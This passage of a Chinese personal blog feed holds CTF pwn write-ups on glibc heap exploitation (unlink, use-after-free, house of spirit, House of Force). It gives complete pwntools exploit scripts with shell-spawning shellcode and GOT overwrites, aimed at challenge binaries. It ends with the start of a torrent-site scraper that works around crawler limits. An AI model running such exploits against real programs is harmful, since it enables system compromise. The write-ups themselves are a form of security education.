</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Unlink</h1>
<p>对于两个释放了的物理相邻的chunk，在内存回收进行合并时会加入新的bin，此时有可能产生攻击点</p>
<p>unlink的过程：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309195222.png" alt="20210309195222"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当我们 free() 时</span><br><span class="line">glibc 判断这个块是 small chunk</span><br><span class="line">判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</span><br><span class="line">判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</span><br><span class="line">继而对 Nextchunk 采取 unlink 操作</span><br><span class="line"></span><br><span class="line">unlink 具体执行的效果:</span><br><span class="line">FD=P-&gt;fd = target addr -12</span><br><span class="line">BK=P-&gt;bk = expect value</span><br><span class="line">FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</span><br><span class="line">BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</span><br></pre></td></tr></table></figure>
<h1>UAF</h1>
<p>主要有这两种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">释放后没有被置为NULL的指针称为dangling pointer（悬空指针）</span><br><span class="line">没有初始化的指针称为wild pointer（野指针）</span><br></pre></td></tr></table></figure>
<p>关注到free后没有把指针指向NULL的代码片段</p>
<h2 id="hacknote">hacknote</h2>
<p>据说是很经典的UAF入门题。网上关于这个题的分析有很多了，但还有一些点是自己看了别人的wp然后想了好久才理解到的，就记录一下一些点。</p>
<p>第一次add两个node时：<br>
notelist数组中的值：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218132834.png" alt="20201218132834"></p>
<p>notelist[i]指向的chunk中的内容，其中0x0804865b是print_note_content函数的地址：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133230.png" alt="20201218133230"></p>
<p>删除两个node后：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133934.png" alt="20201218133934"><br>
可以看到chunk里的内容改变了，但是notelist数组的前两个值依然指向原来的chunk<br>
（这里free的顺序出了点小问题）</p>
<p>再次add一个大小为8的node时：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218134358.png" alt="20201218134358"><br>
发现原来的两个chunk分配给了新生成的node，。<br>
因为上面free的顺序反了导致notelist[0]和[2]指向了相同的位置，本可以把第一个chunk的内容覆盖为system的gadget，不过…意思到了就行。</p>
<p>如果覆盖为system(…)即程序提供的magic函数，就可以print_nodelist[0],调用magic函数，获得shell</p>
<p>over！</p>
<h1>FASTBIN有关的漏洞</h1>
<ol>
<li>fastbin double free</li>
<li>house of spirit</li>
<li>alloc to stack</li>
<li>arbitrary alloc</li>
</ol>
<p>前两种主要侧重利用free函数释放真的或者伪造的chunk，然后再申请chunk进行攻击；后两种侧重于修改fd指针，利用malloc申请执行位置的chunk<br>
原理在于，fastbin由单链表维护，并且fastbin中的chunk即使释放了，next_chunk的pre_inuse位也不会清空</p>
<h2 id="lctf2016-pwn200">lctf2016-pwn200</h2>
<p>首先依旧是：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212059.png" alt="20210316212059"><br>
发现什么保护都没有开，（这就使得这个题有两种做法…）<br>
再用ROPgadget搜索，没有看到system和/bin/sh</p>
<p>用ida打开，先看一波main_2函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212316.png" alt="20210316212316"><br>
其中第一个漏洞点就是在输入 “who am i” 的时候，当输入长度为48的时候，最后一位（本应该是结束符\0）会变成有效的字符，与后续的rbp相连，在下一句printf会将rbp打印出来<br>
该函数的倒数第二句，在ida的伪c代码中，input返回后没有赋给任何变量，但实际上看汇编代码会发现：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316213816.png" alt="20210316213816"><br>
刚好紧挨在“whoami”的上边</p>
<p>再看main_2的返回函数<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316214104.png" alt="20210316214104"><br>
程序唯一的两个出现malloc的函数之一。<br>
这个函数主要是分配一个固定大小的区域，然后将输入的buf复制到区块中，再把地址赋给ptr，ptr存在bss段中（0x0602098）。<br>
strcpy有多危险就不用说了，其次，buf的长度为0x38，读入的长度却是0x40，可以把dest覆盖掉：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215426.png" alt="20210316215426"></p>
<p>随后的loo函数就是一个选择菜单功能，其中有checkin和checkout。checkout函数在检查指针存在性后，把ptr的堆块释放，并把指针置为0。<br>
checkout函数如下：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215654.png" alt="20210316215654"><br>
把输入的“long”当作malloc的大小，malloc出的地址赋给ptr，然后再把&quot;money&quot;直接放入新建立的chunk中。</p>
<h3 id="HOS">HOS</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165708.png" alt="20210315165708"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165656.png" alt="20210315165656"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315222308.png" alt="20210315222308"></p>
<p>大致的思路就是：</p>
<ul>
<li>在第一次输入money（存入buf）时构造出一个chunk（方法是覆盖dest），指向输入的这个栈，此时这个区域在计算机的角度就成了一个chunk。</li>
<li>将这个堆释放再分配，这个区域就变得可控，可以一直控制到返回地址</li>
<li>因为这些函数是一个调用一个的，所以choose 3，结束了最顶层的函数，就可以返回执行shellcode</li>
</ul>
<p>其中exp（下）中传入的id==0x61，意思是伪造fake_chunk的下一个chunk（物理相连）的size。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316223428.png" alt="20210316223428"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line"></span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line">fake_chunk = rbp - <span class="number">0xb0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;17&quot;</span>)	<span class="comment">#?min==17</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;money~&quot;</span>)</span><br><span class="line"><span class="comment">#payload = &quot;A&quot;*0x8 + &quot;B&quot;*0x10</span></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">8</span> + p64(<span class="number">0x61</span>) + <span class="string">&quot;\x00&quot;</span>*<span class="number">0x28</span> + p64(fake_chunk)   <span class="comment">#make a fake_chunk here</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;how long?&quot;</span>,<span class="string">&quot;79&quot;</span>)   <span class="comment">#97==0x61</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p64(shellcode_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;money : &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>多调试！！！</p>
<h3 id="非HOS">非HOS</h3>
<p>把dest的值覆盖为free_got，；此时如果buf中为&quot;shellocde_addr&quot;+“\x00”*n，free的got表就指向shellcode，执行free时就相当于执行shellocde</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">shellcode=<span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))	</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"><span class="comment"># leak rbp &amp; shellcode_addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;~\n&quot;</span>)</span><br><span class="line">payload = p64(shellcode_addr) + <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x38</span>-<span class="built_in">len</span>(p64(shellcode_addr))) + p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2014-hack-lu-oreo">2014 <span class="exturl" data-url="aHR0cDovL2hhY2subHU=">hack.lu<i class="fa fa-external-link-alt"></i></span> oreo</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101129.png" alt="20210331101129"></p>
<p>拖到ida里分析一波，main函数做了个初始化<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101246.png" alt="20210331101246"><br>
sub_804898D()里包括了菜单和进入各个功能函数的跳转<br>
（说个题外话，这题用sendlineafter的话会一直等待after的字符串，不知道为啥…</p>
<p>嗯，继续</p>
<p>add：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102125.png" alt="20210331102125">add函数做了如下操作：</p>
<ul>
<li>开辟0x38大小的空间</li>
<li>从0x19的位置开始读入最长为0x38的字符串，并在末尾\0</li>
<li>从起始位置读入长度为0x38的字符串，并在末尾\0</li>
<li>add_not_order_num+1</li>
</ul>
<p>show_add:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102328.png" alt="20210331102328"></p>
<p>order：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102253.png" alt="20210331102253"></p>
<p>bss段：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331130920.png" alt="20210331130920"></p>
<p>整理一下这三个函数，大概能判断出枪支chunk的样子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">size</span><br><span class="line">describtion 	<span class="comment">//size = 0x19</span></span><br><span class="line">name	<span class="comment">//size = 0x1F</span></span><br><span class="line">pre_chunk_ptr</span><br></pre></td></tr></table></figure>
<p>cut_input:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102416.png" alt="20210331102416"><br>
其实就是一个把字符串末尾置为\0…再和add函数的输入部分判断一下，明显有点不安全啊…</p>
<p>大概的思路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在add时溢出伪造指向前一个chunk的指针指向puts_got，调用show_add时就可以泄露puts的地址，获得system的地址</span><br><span class="line">接下来就只需要修改某个函数的got表指向的内容然后试着执行/bin/sh，而要做到这个需要：</span><br><span class="line">2. 把某段内存变成完全可控的chunk，且大小需要满足malloc(0x38)。看了看bss段，发现&quot;.bss:0804A2A8 order_mesg_ptr&quot;好像满足要求，而且这个位置前后也没啥用 </span><br><span class="line">3. 获得了可控的地址后寻找可以篡改的函数got，且要能执行输入的/bin/sh字符串</span><br></pre></td></tr></table></figure>
<p>第一步比较好解决：<br>
用gdb add出两个chunk，数一下就能知道payload该填多少trash<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331165524.png" alt="20210331165524"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">27</span> + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(payload,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: aaa\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys = puts_addr - <span class="number">0x24f00</span></span><br></pre></td></tr></table></figure>
<p>第二步，想要在bss段上构造一个chunk（如下图）的话，</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331183238.png" alt="20210331183238"><br>
（另外还要把order_mesg_ptr看作chunk的size，置为0x40）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;<span class="number">0x3f</span>:</span><br><span class="line">	add(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">	a+=<span class="number">1</span></span><br><span class="line"><span class="comment">#0x3f and leave one here</span></span><br><span class="line">fake_chunk = <span class="number">0x0804A2A8</span></span><br><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">27</span>+p32(fake_chunk),<span class="string">&quot;aaaa&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>是很明显的。<br>
但如何能让这块区域能够使用就要考虑free时对next_chunk的判断：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x20</span> + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(<span class="number">100</span>)</span><br><span class="line">add_message(payload)</span><br></pre></td></tr></table></figure>
<p>此时order()后，fastbin接收的（唯一一个）chunk将在下一次malloc时分配出去<br>
随后修改strlen指向的地址就能在cut_input()时getshell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>]).ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&quot;aaa&quot;</span>,payload)</span><br><span class="line">add_message(p32(sys)+<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># system(p32(system_addr);&quot;/bin/sh&quot;) = system(p32(system_addr));system(&quot;/bin/sh&quot;);</span></span><br></pre></td></tr></table></figure>
<p>另：写一半把ida关了，且没保存数据orz，所以最后就写的比较快且没有截图了…</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDcyMTQuaHRt">https://bbs.pediy.com/thread-247214.htm<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L2dsaWJjLWhlYXAvZmFzdGJpbl9hdHRhY2svIzIwMTQtaGFja2x1LW9yZW8=">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2014-hacklu-oreo<i class="fa fa-external-link-alt"></i></span></p>
<h1>House of Force</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用条件:</span><br><span class="line">- 能够以溢出等方式修改top chunk的size域</span><br><span class="line">- 自由控制堆分配的大小</span><br><span class="line"></span><br><span class="line">步骤:</span><br><span class="line">1. malloc(100)//随便分配一个chunk</span><br><span class="line">2. 使用溢出修改top chunk的size为一个大数//不会去调用mmap</span><br><span class="line">3. malloc(size)//size=目标地址减去 top chunk 地址，再减去 chunk 头的大小</span><br><span class="line">4. p = malloc(100); p == 目标地址</span><br><span class="line"></span><br><span class="line">摘自0x2l师傅的文章</span><br></pre></td></tr></table></figure>
<h2 id="题">题</h2>
<h3 id="HITCON-TRAININGLAB-11">HITCON TRAININGLAB 11</h3>
<p>略…<br>
相关记录在2021-03-22的日报里</p>
<h3 id="BCTF-bcloud">BCTF-bcloud</h3>
<p>搞了好久…现在是早上五点，不想写了<br>
注释啥的都在exp和ida文件里<br>
有两种方法，主要是把top_chunk指向bss段的content_ptr或content_len，由此可以在里边任意写，更改函数got表指向的内容。</p>
<p>画图和调试很重要！</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bcloud&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bcloud&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span> (<span class="params"><span class="built_in">len</span>, content</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the id:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the id:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the new content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name:\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">first_heap = u32(p.recv()[<span class="number">68</span>:<span class="number">4</span>+<span class="number">68</span>].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">8</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(first_heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Host:\n&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line">topchunk_addr = first_heap + <span class="number">0x48</span>*<span class="number">3</span>			<span class="comment">#这里第一次时候因为看gdb显示每个chunk大小是0x49，就写了0x49*3，但其实那个size应该是包括了pre_use的，因此是0x48</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;topchunk_addr : &quot;</span> + <span class="built_in">hex</span>(topchunk_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line"></span><br><span class="line">target_addr = content_len - <span class="number">8</span>		<span class="comment">#?</span></span><br><span class="line">off_target = target_addr - topchunk_addr</span><br><span class="line">malloc_size = off_target - <span class="number">4</span> -<span class="number">7</span>		<span class="comment">#??</span></span><br><span class="line"></span><br><span class="line">add(malloc_size -<span class="number">4</span> , <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># now, topchunk_addr -&gt; content_len-8	?</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关于这个topchunk指向的问题，上下两种方法在调试时，试了malloc几个相近的大小（±0x10），pwndbg的topchunk都指向0x804b000，在后面分配时也没有显示增加了chunk</span></span><br><span class="line"><span class="comment"># 目前还不知道是为啥...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">16</span>)*<span class="number">3</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*(content_ptr - content_len -<span class="number">12</span>) </span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span></span><br><span class="line"><span class="comment">#create 3 contents, with len==16, contents = free_got_addr, atoi_got_addr, ~</span></span><br><span class="line">add(<span class="number">1000</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#free_got points to puts_plt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)		<span class="comment">#puts no.1&#x27;s content, which is atoi_got_addr</span></span><br><span class="line">atoi_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;atoi_addr: &quot;</span> + <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line">offset = atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">sys_addr = offset + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p32(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#泄露puts</span></span><br><span class="line"><span class="comment">## 前面与↑相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line">target_addr = content_ptr </span><br><span class="line">malloc_size = target_addr - topchunk_addr -<span class="number">0x10</span></span><br><span class="line">add(malloc_size, <span class="string">&#x27;junk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># topchunk -&gt; content_ptr - 0x8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下部分用gdb查看内存中的内容比较容易搞懂</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0x804b130</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,payload )</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))    <span class="comment">#修改free_got为puts_plt</span></span><br><span class="line">delete(<span class="number">2</span>)   <span class="comment">#输出puts_addr</span></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts: &quot;</span> + <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys_addr = puts_addr - <span class="number">0x24f00</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>做这题的时候感觉很奇怪。首先是第一种泄露atoi的方法，似乎只在给定libc的时候有效，把获得的atoi的地址放进libc database里查的时候查不到对应的libc…而第二种泄露puts的方法就可以正常getshell</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9teS5vc2NoaW5hLm5ldC91LzQzNDc2ODgvYmxvZy8zNTYxNzY1">一<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYS9hcnRpY2xlL2RldGFpbHMvMTA1NTg4MDU4">二<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>版本识别论文阅读</title>
    <url>/52245.html</url>
    <content><![CDATA[<h1>V1SCAN: Discovering 1-day Vulnerabilities in Reused C/C++ Open-source Software Components Using Code Classification Techniques</h1>
<p>检测复用c/c++组件带来的1day。目前有基于版本和基于代码的方法，基于代码的方法在代码修改后复用的场景下，检测结果可能会带来大量误报和漏报。<br>
本文结合了这两类方法</p>
]]></content>
  </entry>
  <entry>
    <title>RARBG上种子收集脚本</title>
    <url>/38266.html</url>
    <content><![CDATA[<p>跟着<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjU5NTguaHRt">使用winafl对迅雷的torrent解析逻辑进行fuzz<i class="fa fa-external-link-alt"></i></span>做的时候收集BT语料库（种子种子…哈哈哈哈哈哈哈哈哈哈哈）的脚本<br>
收集RARBG上的一些.torrent文件</p>
<span id="more"></span>
<p>弄了一半发现这个站对爬虫做了点限制，并且24小时内下载超过100个左右的种子就只能用磁链了</p>
<p>虽然磁链好像能转BT来着，不过没试过</p>
<p>只能手动切换代理，没写自动切换的代码，可参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZTRkNzUyOTQ3NmQ=">https://www.jianshu.com/p/5e4d7529476d<i class="fa fa-external-link-alt"></i></span></p>
<p>讲真选择爬RARBG真是…选了个麻烦的</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kv = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;rarbgmirror.org&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DNT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span 